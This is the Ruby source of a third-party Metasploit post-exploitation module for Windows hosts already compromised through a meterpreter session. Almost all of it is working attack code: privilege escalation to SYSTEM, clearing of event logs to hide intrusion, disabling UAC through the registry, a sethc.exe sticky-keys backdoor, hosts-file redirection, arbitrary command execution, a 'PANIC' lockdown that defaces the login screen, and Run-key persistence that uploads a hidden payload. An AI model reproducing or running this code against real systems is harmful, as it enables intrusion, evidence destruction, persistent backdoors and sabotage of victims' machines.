##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
#
# [ my-auxiliary.rb ] post-exploitation auxiliary module.
# $Id$ 3.4 Author: pedr0 Ubuntu [r00t-3xp10it]
# Hosted By: peterubuntu10[at]sourceforge[dot]net
# http://sourceforge.net/p/myauxiliarymete/wiki/Home/
# ---------------------------------------------
# Based on: [darkoperator & sinn3r] metasploit modules!
# http://www.offensive-security.com/metasploit-unleashed/Building_A_Module
# http://www.offensive-security.com/metasploit-unleashed/Useful_API_Calls
# http://www.rubydoc.info/github/rapid7/metasploit-framework/index
# (the only CORE/API documentation available to study) :(
# ---------------------------------------------
# Port the auxiliary module to metasploit database (local):
# [Kali linux]   COPY THE MODULE TO: /usr/share/metasploit-framework/modules/auxiliary/analyze/my-auxiliary.rb
# [Ubuntu linux] COPY THE MODULE TO: /opt/metasploit/apps/pro/msf3/modules/auxiliary/analyze/my-auxiliary.rb
# [Manually Path Search]: root@kali:~# locate modules/auxiliary/analyze
# ----------------------------------------------
# USAGE:
# msf > use auxiliary/analyze/my-auxiliary
# msf post(my-auxiliary) > show options
#
##
 
 
 
# -----------------------------------
# Module Dependencies
# -----------------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/accounts'
 
 
 
# -------------------------------------
# Class name should reflect directories
# -------------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Registry
         include Msf::Post::Windows::Accounts
 
 
 
# ------------------------------------
# Building Metasploit/Armitage info/GUI
# ------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => '[my-auxiliary.rb] Post-Exploitation 3.4',
                        'Description'   => %q{
                                        this module needs a meterpreter session open,
                                to gather info about target machine by default (advanced SYSINFO),
                                the option (GETPRIVS) will try to rise meterpreter to SYSTEM privileges,
                                (CLEAR) will clean IDS event logfiles on target host,
                                (UACSET) will Check UAC settings and is level of running,
                                (UACBYPASS) will try to bypass UAC settings using regedit,
                                (LOGIN) will try to enumerate recently logged on users,
                                (APPL) will enumerate Installed Applications of target host,
                                (STARTBROWSER) opens URL using target Browser.
                                (HOSTFILE) add entrys to target hostfile <ip-add> <domain>,
                                (DELHOST) revert target hostfile to default settings,
                                (MSG) will execute the input message on target desktop,
                                (SHUTDOWN) will ask for the amount of time to shutdown the remote host,
                                (LABEL) will rename the c: harddrive display name,
                                (HIDETASK) disable task manager display on target host,
                                (EXECUTE) will execute an arbitary cmd command on target host,
                                (STOPPROCESS) stop a running process on target host,
                                (SETCH) will backdoor setch.exe on target system, just Press Shift key 5 times
                                at Login Screen and you should be greeted by a shell,
                                (to bypass user credentials: net user username *)
                                (PANIC) Disable ControlPanel, hide Drives, hide desktop icons,
                                DisableTaskMgr, restrict access to webBrowsers [IExplorer,Chrome,Firefox],
                                logoff target host, and display a msg at login time.
 
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'peterubuntu10[at]sourceforge[dot]net',
                                        'Special thanks to [darkoperator & sinn3r] from rapid7',
                                ],
 
                        'Version'        => '$Revision: 3.4',
                        'DisclosureDate' => 'dec 2 2015', # fist one
                        'Platform'       => 'windows',
                        'Arch'           => 'x86',
                        'References'     =>
                                [
                                        [ 'URL', 'http://www.r00tsect0r.net' ],
                                        [ 'URL', 'https://www.facebook.com/dwebcrew' ],
                                        [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                        [ 'URL', 'http://sourceforge.net/projects/myauxiliarymete/?source=navbar' ],
                                        [ 'URL', 'http://oldmanlab.blogspot.pt/p/meterpreter-api-cheat-sheet.html' ],
                                        [ 'URL', 'http://www.rubydoc.info/github/rapid7/metasploit-framework/index' ],
                                        [ 'URL', 'http://www.offensive-security.com/metasploit-unleashed/Building_A_Module' ],
                                        [ 'URL', 'https://github.com/rapid7/metasploit-framework/tree/master/modules/post' ],
                                ],
			'DefaultOptions' =>
				{
					'SESSION' => '1',
				},
                        'SessionTypes'   => [ 'shell', 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptBool.new('APPL', [ false, 'Enumerate installed applications' , false]),
                                OptBool.new('CLEAR', [ false, 'Clear IDS event logFiles on target', false]),
                                OptBool.new('DELHOST', [ false, 'Revert target hostfile to default settings' , false]),
                                OptBool.new('GETPRIVS', [ false, 'Migrate meterpreter to NT AUTHORITY/SYSTEM' , false]),
                                OptBool.new('HIDETASK', [ false, 'Restrict access to  task manager' , false]),
                                OptBool.new('UACSET', [ false, 'Check UAC settings on target', false]),
                                OptBool.new('UACBYPASS', [ false, 'Bypass UAC security settings', false]),
                                OptBool.new('LOGIN', [ false, 'Enumerate Recently logged on users' , false]),
                                OptBool.new('SETCH', [ false, 'Backdoor setch.exe on target host' , false]),
                                OptBool.new('PANIC', [ false, 'Hide ControlPanel,Hide Drives,DisableTaskMgr,etc...' , false]),
                                OptString.new('HOSTFILE', [ false, 'Syntax: <redirect to ip> <Legit domain name>']),
                                OptString.new('MSG', [ false, 'Input the message to display on target desktop']),
                                OptString.new('STOPPROCESS', [ false, 'Stop process by is executable name <firefox.exe>']),
                                OptString.new('LABEL', [ false, 'Input the HardDrive C: new display name']),
                                OptString.new('SHUTDOWN', [ false, 'Schedule a remote shutdown in seconds']),
                                OptString.new('EXECUTE', [ false, 'Execute an arbitary cmd command on target']),
                                OptString.new('STARTBROWSER', [ false, 'Open Browser URL in target <firefox.exe> <ip-address>'])
                        ], self.class)
 
 
                register_advanced_options(
                        [
                                OptBool.new('HOWTO', [ false, 'howto powershell persistence' , false]),
                                OptString.new('PERSISTENCE', [ false, 'input powershell.bat display name'])
                        ], self.class)
 
        end
 
 

# --------------------------------------------------------
# Check (def run) for proper target Platform (win32|win64)
# --------------------------------------------------------
def unsupported
   print_error(" This auxiliary only runs against windows systems!")
   print_error(" Please execute [info] for further information...")
   raise Rex::Script::Completed
end



 
# ------------------------------------
# Clean IDS logfiles on target host
# ------------------------------------
       def ls_clear

         # list of IDS logfiles
         evtlogs = [
            'security',
            'system',
            'application',
            'directory service',
            'dns server',
            'file replication service'
     ]
 
             begin
               # clear IDS event logfiles
               print_status("Clean IDS EventLogs of: #{sysinfo['Computer']}")
               evtlogs.each do |evl|
               print_good("Cleaning => #{evl} EventLog")
                 log = session.sys.eventlog.open(evl)
                 log.clear
 
             end
             print_status("All EventLogs have been cleared!")
       rescue ::Exception => e
       print_error("Error clearing Event Log: #{e.class} #{e}")
       print_error("Try to rise meterpreter session to [NT AUTHORITY/SYSTEM] befor runing this module")
       end
 end
 
 
 
 
# ------------------------------------
# Getting session authority/system privs
# ------------------------------------
       def ls_privs
 
             toor = []
             # increase meterpreter to system privs
             toor = client.sys.config.getuid
             print_status("Increase meterpreter to: [ NT AUTHORITY/SYSTEM ]")
             print_error("Session UID: #{toor}")
             client.sys.config.getprivs.each do |priv|
             print_good("Increase => #{priv}")
       end
 
         # checking results (if_system)
         result = client.priv.getsystem
         if result and result[0]
 
                toor = []
                # print results on screen if successefully executed
                toor = client.sys.config.getuid
                print_status("Obtained system via technique: #{result[1]}")
                print_good("Current Session UID: #{toor}")

      else
      # error display in executing command
      print_error("Fail to obtain [NT AUTHORITY/SYSTEM] access!")
      print_error("Are you running a java meterpreter payload? 'we can not rise a java payload to system privs'")
      end
 end
 
 


# ----------------------------
# Check UAC settings on target machine
# ----------------------------
        def uac_enabled
          key = []
          uac = []
          # building table display
          tbl = Rex::Ui::Text::Table.new(
              'Header'  => 'Target UAC settings',
              'Indent'  => 1,
              'Columns' =>
          [
                      'Is Admin',
                      'Is System',
                      'UAC [0=disable 1=enable]',
                      'Prompt [0=never 2=allways]'
          ])
 
     # Gather target user data
     admin = is_admin? ? 'True' : 'False'
     sys   = is_system? ? 'True' : 'False'
     # uac   = is_uac_enabled? ? 'True' : 'False'
     uac << registry_getvaldata('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System','EnableLUA')
     key << registry_getvaldata('HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System','ConsentPromptBehaviorAdmin')
 
     # Store in tables and print results on screen
     tbl << [admin, sys, uac, key]
     print_line("\n" + tbl.to_s + "\n")
 end
 
 
 
# ----------------------------
# bypass UAC settings using regedit
# ----------------------------
        def uac_bypass
          # list of arrays to be executed
          bypass = [
          'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f',
          'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f',
          'shutdown /l /f'
     ]
 
        r=''
        # display adictional info about 'UACBYPASS' module
        print_status("Bypass UAC settings of: #{sysinfo['Computer']}")
        print_status("The 'UACBYPASS' module will add 2 registry keys to remote host")
        print_status("then will logoff, so next time target logins will have is UAC disable")
        print_good("Adding registry keys to: #{sysinfo['Computer']}")
        # executing list of arrays
        bypass.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_good("Add Key => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 rescue ::Exception => e
                  print_error("Error Running Command: #{e.class} #{e}")
                  print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
                 end
        end
        print_status("Bypass UAC module successfully executed!")
 end
 
 
 
# ----------------------------
# Enumerate Recently logged on users
# ----------------------------
        def ls_logged
          sids = []
          # storing registry keys SID
          sids << registry_enumkeys("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList")
          tbl = Rex::Ui::Text::Table.new(
              'Header'  => "Recently Logged Users",
              'Indent'  => 1,
              'Columns' =>
           [
                      'SID',
                      'Profile Path'
           ])
 
      # storing registry keys Profile Path
      sids.flatten.map do |sid|
      profile_path = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\#{sid}","ProfileImagePath")
      tbl << [sid,profile_path]
     end
     print_line("\n" + tbl.to_s + "\n")
 end
 
 
 
# ----------------------------
# Enumerate Intalled applications
# ----------------------------
        def ls_installed
          # making table to display results
          tbl = Rex::Ui::Text::Table.new(
              'Header'  => "Installed Applications",
              'Indent'  => 1,
              'Columns' =>
           [
                      'Name',
                      'Version'
           ])
 
        # list of registry keys to scann
        appkeys = [
                'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
                'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall',
                ]
        apps = []
        appkeys.each do |keyx86|
                found_keys = registry_enumkeys(keyx86)
                if found_keys
                        found_keys.each do |ak|
                                apps << keyx86 +"\\" + ak
                        end
                end
        end
 
 
        # appl list key empty
        t = []
        while(not apps.empty?)
 
                1.upto(16) do
                        t << framework.threads.spawn("Module(#{self.refname})", false, apps.shift) do |k|
                                begin
                                        dispnm = registry_getvaldata("#{k}","DisplayName")
                                        dispversion = registry_getvaldata("#{k}","DisplayVersion")
                                        tbl << [dispnm,dispversion] if dispnm and dispversion
                                rescue
                                end
                        end
 
                end
                t.map{|x| x.join }
        end
        results = tbl.to_s
        print_line("\n" + results + "\n")
end
 
 
 
 
 
# ------------------------------------
# manipulating HOSTFILE of target
# ------------------------------------
        def ls_manypulating
          r=''
          print_status("Add entry to: #{sysinfo['Computer']} HostFile")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c copy %SYSTEMROOT%\\\\system32\\\\Drivers\\\\etc\\\\hosts %SYSTEMROOT%\\\\system32\\\\Drivers\\\\etc\\\\hosts-backup", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Building default HostFile BackUp")
 
             # close channel when done
             r.channel.close
             r.close
             # redirecting to 2º step
             ls_mannn
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
          def ls_mannn
            r=''
            m = datastore['HOSTFILE']
            # execute cmd prompt in a hidden channelized windows!
            r = session.sys.process.execute("cmd.exe /c echo #{m} >> %SYSTEMROOT%\\\\system32\\\\Drivers\\\\etc\\\\hosts", nil, {'Hidden' => true, 'Channelized' => true})
            print_good("Added entry => #{m}")
 
                # close channel when done
                print_status("Successfully added value to HostFile")
                r.channel.close
                r.close
          rescue ::Exception => e
          print_error("Error Running Command: #{e.class} #{e}")
          print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# Open URL in target host (using is browser)
# ------------------------------------
       def ls_browser
          r=''
          m = datastore['STARTBROWSER']
          print_status("Open Browser URL on: #{sysinfo['Computer']}")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c start #{m}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Browser URL => #{m}")
 
             # close channel when done
             print_status("Command executed successfully!")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# revert target hostfile to default settings
# ------------------------------------
       def ls_delhost
         r=''
         print_status("Revert: #{sysinfo['Computer']} HostFile to default settings")
         # execute cmd prompt in a hidden channelized windows!
         r = session.sys.process.execute("cmd.exe /c MOVE /Y %SYSTEMROOT%\\\\system32\\\\Drivers\\\\etc\\\\hosts-backup %SYSTEMROOT%\\\\system32\\\\Drivers\\\\etc\\\\hosts", nil, {'Hidden' => true, 'Channelized' => true})
         print_good("Hostfile Status => Clean")
 
            # close channel when done
            print_status("Target HostFile reverted to default!")
            r.channel.close
            r.close
       rescue ::Exception => e
       print_error("Error Running Command: #{e.class} #{e}")
       print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
       print_error("WARNING: use this module if you have previous used 'HOSTFILE' module")
 end
 
 
 
# ------------------------------------
# Display Message on target desktop
# ------------------------------------
        def ls_mensage
          r=''
          m = datastore['MSG']
          print_status("Execute messagebox on: #{sysinfo['Computer']}")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c msg * #{m}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Msgbox => #{m}")
 
             # close channel when done
             print_status("Message deliver successfully!")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# Shutdown remote host in xx time
# ------------------------------------
        def ls_shutdown
          r=''
          t = datastore['SHUTDOWN']
          print_status("Schedule remote shutdown of: #{sysinfo['Computer']}")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c shutdown /s /t #{t}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Schedule in => #{t} sec")
 
             # close channel when done
             print_status("Successfully schedule shutdown!")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# Execute an arbitary command on target
# ------------------------------------
        def ls_execute
          r=''
          n = datastore['EXECUTE']
          print_status("Execute an arbitary CMD command on: #{sysinfo['Computer']}")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c #{n}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Execute command => #{n}")
 
             # close channel when done
             print_status("Command executed successfully!")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# stop process from running
# ------------------------------------
        def ls_stopprocess
          r=''
          d = datastore['STOPPROCESS']
          print_status("Stop: #{d} Process on: #{sysinfo['Computer']}")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c taskkill /F /IM #{d}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("Execute command => cmd.exe /c taskkill /F /IM #{d}")
 
             # close channel when done
             print_status("Process successsfully Stoped: #{d}")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
# ------------------------------------
# Label Harddrive display name
# ------------------------------------
        def ls_label
          r=''
          n = datastore['LABEL']
          print_status("Rename HardDrive C: display name")
          # execute cmd prompt in a hidden channelized windows!
          r = session.sys.process.execute("cmd.exe /c label C: #{n}", nil, {'Hidden' => true, 'Channelized' => true})
          print_good("HardDrive New label => #{n}")
 
             # close channel when done
             print_status("Successefully renamed HardDrive!")
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
# ------------------------------------
# Disable task-manager display on target PC
# -----------------------------------
          def ls_hidetask
          # list of arrays to be executed
          keys = [
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t REG_DWORD /d 1 /f'
     ]
 
        r=''
        # executing list of arrays on target system
        print_status("Disable Task Manager access on: #{sysinfo['Computer']}")
        session.response_timeout=120
        keys.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_good("Add Key => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                rescue ::Exception => e
                 print_error("Error Running Command: #{e.class} #{e}")
                 print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
                end
        end
        print_status("Successfully restricted the use of taskmgr!")
 end
 
 
 
 
 
# ------------------------------------
# Backdooring 'Setch.exe' on target PC
# ------------------------------------
        def ls_setch
          # list of arrays to be executed
          arrays = [
            'takeown /f %SYSTEMROOT%\\\\system32\\\\sethc.exe',
            'icacls %SYSTEMROOT%\\\\system32\\\\sethc.exe /grant administrators:f',
            'rename %SYSTEMROOT%\\\\system32\\\\sethc.exe  sethc-backup.exe',
            'copy %SYSTEMROOT%\\\\system32\\\\cmd.exe %SYSTEMROOT%\\\\system32\\\\shell.exe',
            'rename %SYSTEMROOT%\\\\system32\\\\shell.exe sethc.exe'
     ]
 
        r=''
        # executing list of arrays on target system
        print_status("Remotelly backdoor [setch.exe] of: #{sysinfo['Computer']}")
        session.response_timeout=12
        arrays.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_good("Execute command => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 rescue ::Exception => e
                  print_error("Error Running Command: #{e.class} #{e}")
                  print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
                 end
        end
        print_status("Commands executed successfully!")
        print_error("Press Shift key 5 times at Login Screen and you should be greeted by a shell")
 end
 
 
 
# ------------------------------------
# PANIC mode :D
# Disable ControlPanel, DisallowRun major webbrowsers
# DisableTaskMgr,Disable Run,Disable Find,hide Drives,
# hide desktop icons,Diplay msg at login time.
# ------------------------------------
        def ls_panic
          # list of arrays to be executed
          hacks = [
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 1 /t REG_SZ /d iexplore.exe /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 2 /t REG_SZ /d chrome.exe /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 3 /t REG_SZ /d firefox.exe /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDesktop /t REG_DWORD /d 1 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFind /t REG_DWORD /d 1 /f',
            'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 1 /t REG_SZ /d iexplore.exe /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 2 /t REG_SZ /d chrome.exe /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 3 /t REG_SZ /d firefox.exe /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f',
            'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t REG_DWORD /d 1 /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v legalnoticecaption /t REG_SZ /d WARNING /f',
            'REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v legalnoticetext /t REG_SZ /d hacked! /f',
            'shutdown /l /f'
     ]
 
        r=''
        # executing list of arrays on target system
        print_status("hide the HardDrives under 'my computer', Disable TaskManager access,")
        print_status("restrict the access to ControlPanel, restrict Run, restrict Find,")
        print_status("hide desktop icons, restrict access to webBrowsers [iexplorer,chrome,firefox],")
        print_status("logoff current user and display a msg at login time.")
        print_good("Adding registry keys to: #{sysinfo['Computer']}")
        session.response_timeout=120
        hacks.each do |cmd|
                begin
                  # execute cmd prompt in a hidden channelized windows
                  r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
                  print_good("PANIC => #{cmd}")
 
                     # close client channel when done
                     while(d = r.channel.read)
                             break if d == ""
                     end
                     r.channel.close
                     r.close
                 rescue ::Exception => e
                  print_error("Error Running Command: #{e.class} #{e}")
                  print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
                end
        end
        print_status("Reg Keys added successfully!")
end
 
 
 
# ----------------------------
# howto use persistence powershell auxiliary
# ----------------------------
        def ls_howto
          # display information howto use 'poweshell.bat persistence'
          print_status("--------[ HOWTO USE POWERSHELL PERSISTENCE ]--------")
          print_status("this module as made to be of assistance to netool.sh")
          print_status("powershell automated exploit module in <r00tsect0r> ")
          print_status("----------------------------------------------------")
          print_line("")
          print_line("   'powershell.bat' (or another name.bat) must be stored")
          print_line("   under /var/www/ so the script can copy it to a remote")
          print_line("   target previous exploited using the meterpreter session.")
          print_line("   in adiction 'hidden.vbs' with instructions to run the")
          print_line("   powershell.bat in a hidden cmd windows as to be stored")
          print_line("   under /var/www/ to be uploaded too.")
          print_line("")
          print_line("                  -[ DESCRIPTION ]-")
          print_line("   this module will ask for the name of the powershell payload")
          print_line("   and then upload it to %SYSTEM32% on target system, it also")
          print_line("   uploads the 'hidden.vbs' file build by netool.sh toolkit")
          print_line("   and add a registry key in HKLM/.../run ro run 'hidden.vbs'")
          print_line("   at every startup.")
          print_line("")
end
 
 
 
# ----------------------------
# persistence powershell module
# ----------------------------
        def ls_persist
          t = []
          k = []
          t = datastore['PERSISTENCE']
          k = 'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v persistence /t REG_EXPAND_SZ /d %SYSTEM32%\\hidden.vbs /f'
 
              # upload files to target system using meterpreter session!
              print_status("Uploading files into: #{sysinfo['Computer']}...")
              client.fs.file.upload_file("%SYSTEM32%\\#{t}", "var/www/#{t}")
              print_good("Upload => %WINDIR%\\SYSTEM32\\#{t}")
              client.fs.file.upload_file("%SYSTEM32%\\hidden.vbs", "var/www/hidden.vbs")
              print_good("Upload => %WINDIR%\\SYSTEM32\\hidden.vbs")
 
                 r=''
                 # add registry key to remote host
                 r = session.sys.process.execute("cmd.exe /c #{k}", nil, {'Hidden' => true, 'Channelized' => true})
                 print_status("Registry key added => HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\persistence)")
                 print_error("The persistence agente 'vbs' will run at every startup!")
                 print_error("Setup a handler, and wait for the target relogin to get a session!")
 
             # close channel when done
             r.channel.close
             r.close
        rescue ::Exception => e
        print_error("Error Running Command: #{e.class} #{e}")
        print_error("Try to rise meterpreter session to [AUTHORITY/SYSTEM] befor runing this module")
 end
 
 
 
 

 
 
 
# ------------------------------------
# Running sellected modules against session target
# and print advanced sysinfo on screen
# ------------------------------------
       def run
       session = client
       unsupported if client.platform !~ /win32|win64/i

         # Variable declarations
         ver = 3.3
         sysnfo = session.sys.config.sysinfo
         runpid = client.sys.process.getpid
         runtor = client.sys.config.getuid
         runtime = client.ui.idle_time
         runsession = client.session_host
         directory = client.fs.dir.pwd
         #directory = client.fs.dir.getlwd
         sdrive = client.fs.file.expand_path("%SYSTEMDRIVE%")
         proc = client.fs.file.expand_path("%NUMBER_OF_PROCESSORS%")
         hpat = client.fs.file.expand_path("%HOMEPATH%")
         
 
       # Print banner and scan results on screen
       print_line("  +----------------------------------------+")
       print_line("  | my-auxiliary post-exploitation #{ver}     |")
       print_line("  | 'automate your post-exploitation tasks'|")
       print_line("  | author: Pedro Ubuntu [ r00t-3xp10it ]  |")
       print_line("  +----------------------------------------+")
       print_line("")
       print_line("    Running on session  : #{datastore['SESSION']}")
       print_line("    Computer            : #{sysnfo['Computer']}")
       print_line("    Operative System    : #{sysnfo['OS']}")
       print_line("    Target IP addr      : #{runsession}")
       print_line("    Session UID         : #{runtor}")
       print_line("    Architecture        : #{sysnfo['Architecture']}")
       print_line("    Meterpreter         : x86/win32")
       print_line("    User idle time      : #{runtime}")
       print_line("    System Language     : #{sysnfo['System Language']}")
       print_line("    System drive        : #{sdrive}")
       print_line("    Nº of processors    : #{proc}")
       print_line("    Current PID payload : #{runpid}")
       print_line("    Home Path           : #{hpat}")
       print_line("    Payload directory   : #{directory}")
       print_line("")
       print_line("")
 
 
 
# ------------------------------------
# Selected settings to run
# ------------------------------------


# ----------------
# one display only
# ----------------
       if datastore['GETPRIVS']
       # what to do when 'GETPRIVS true' is selected
          ls_privs
   end

       if datastore['HIDETASK']
       # what to do when 'HIDETASK true' is selected
          ls_hidetask
   end
 
       if datastore['MSG']
       # what to do when 'MSG' is selected
          ls_mensage
   end

       if datastore['LABEL']
       # what to do when 'LABEL' is selected
          ls_label
   end

       if datastore['EXECUTE']
       # what to do when 'EXECUTE' is selected
          ls_execute
   end

       if datastore['HOSTFILE']
       # what to do when 'HOSTFILE' is selected
          ls_manypulating
   end

       if datastore['DELHOST']
       # what to do when 'DELHOST true' is selected
          ls_delhost
   end

       if datastore['STOPPROCESS']
       # what to do when 'STOPPROCESS' is selected
          ls_stopprocess
   end

       if datastore['STARTBROWSER']
       # what to do when 'STARTBROWSER' is selected
          ls_browser
   end

       if datastore['SHUTDOWN']
       # what to do when 'SHUTDOWN' is selected
          ls_shutdown
   end

# ----------------
# more displays
# ----------------
       if datastore['SETCH']
       # what to do when 'SETCH true' is selected
          ls_setch
   end

       if datastore['PANIC']
       # what to do when 'PANIC true' is selected
          ls_panic
   end

       if datastore['UACBYPASS']
       # what to do when 'UACBYPASS true' is selected
          uac_bypass
 
   end

       if datastore['CLEAR']
       # what to do when 'CLEAR true' is selected
          ls_clear
   end

# ----------------
# tbl displays
# ----------------
       if datastore['LOGIN']
       # what to do when 'LOGIN true' is selected
          ls_logged
   end

       if datastore['UACSET']
       # what to do when 'UACSET true' is selected
          uac_enabled
   end

       if datastore['APPL']
       # what to do when 'APPL true' is selected
          ls_installed
   end

       if datastore['HOWTO']
       # what to do when 'HOWTO true' is selected
          ls_howto
   end

       if datastore['PERSISTENCE']
       # what to do when 'PERSISTENCE true' is selected
          ls_persist
      end
   end
end
